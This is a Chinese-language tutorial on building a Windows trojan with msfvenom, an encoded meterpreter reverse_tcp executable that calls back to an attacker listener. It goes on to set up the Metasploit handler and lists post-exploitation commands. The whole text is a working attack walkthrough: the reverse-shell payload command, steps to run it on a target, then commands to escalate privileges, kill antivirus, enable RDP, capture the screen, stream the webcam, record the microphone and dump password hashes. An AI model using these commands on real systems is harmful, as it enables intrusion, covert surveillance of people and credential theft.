生成木马反弹shell（Windows）

# 一、环境准备

1. MSF-Metasploit Framework
2. 一台windiows靶机

# 二、开始生成木马

1. 使用msfvenom生成木马
2. 终端内输入:   

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.70.3  LPORT=4567  -e x86/shikata_ga_nai -i 5 -f exe -o  shell.exe
```



# 三、配置监控

1. 启动msf   终端内输入：`msfconsole` 启动msf

   ![1642501758409](https://img.gyxnb.top/img/1642501758409.png)

2. 载入监控模块  msf中输入： `use exploit/multi/handler`

   ![1642501831818](https://img.gyxnb.top/img/1642501831818.png)

3. 加载payload  msf终端中输入：`set payload windows/meterpreter/reverse_tcp`

4. 配置payload  msf终端中输入：`show options`

5. 配置payload监控IP msf终端中输入： `set  lhost 192.168.70.3`

6. 配置payload监控端口  msf终端中输入：`set lport  4567` （注意这里要和木马配置时使用的端口相同&如果使用内网穿透服务填写转发后的端口）

7. 检查payload配置  msf终端中输入：`show options` 

   ![1642501934250](https://img.gyxnb.top/img/1642501934250.png)

8. 执行监控  msf终端中输入： `run`

# 四、攻击利用

1. 将木马上传到靶机

2. 在靶机上执行木马

3. 完成攻击利用

   ![1642501969373](https://img.gyxnb.top/img/1642501969373.png)



1. 查看进程：`ps`
2. 查看当前进程号：`getpid`

3. 查看**系统信息**：`sysinfo`

4. 查看目标机是否为虚拟机：

5. `run post/windows/gather/checkvm`

6. 查看完整网络设置：`route`

7. 查看**当前权限**：`getuid`

8. **自动提权**：`getsystem`

9. 关闭杀毒软件：`run post/windows/manage/killav`

10. 启动远程桌面协议：`run post/windows/manage/enable_rdp`

11. 列举当前登录的用户：

12. `run post/windows/gather/enum_logged_on_users`

13. 查看当前应用程序：

14. `run post/windows/gather/enum_applications`

15. 抓取目标机的**屏幕截图**：`load espia` ； `screengrab`

16. 获取相机设备：`webcam_list`

17. 控制拍照 ：`webcam_snap`

18. **直播摄像头**：`webcam_stream`

19.  **观看屏幕**：`run vnc`

20. 控制录音：`record_mic`

21. 查看**当前目录**：`pwd`

22. 查看当前目录：`getlwd`

23. 导出**当前用户密码哈希**  `run hashdump`